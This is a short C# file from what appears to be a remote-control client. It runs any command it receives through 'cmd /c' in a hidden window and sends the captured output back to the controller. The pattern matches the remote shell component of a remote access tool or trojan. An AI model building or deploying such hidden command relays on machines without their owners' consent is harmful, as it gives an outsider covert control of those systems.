using System;
using System.Diagnostics;
using System.Threading;

namespace RemoteClient
{
    public class ExecuteCmd
    {
        public void ExecuteCommandAsync(object command)
        {
            try
            {
                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                procStartInfo.CreateNoWindow = true;
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                // Get the output into a string
                string result = proc.StandardOutput.ReadToEnd();
                RemoteClient.SendMessage(new DataObject { CommandType = "CMD", CommandData = result });
            }
            catch (Exception objException)
            {
                RemoteClient.LogError(objException.ToString());
            }
        }
    }
}
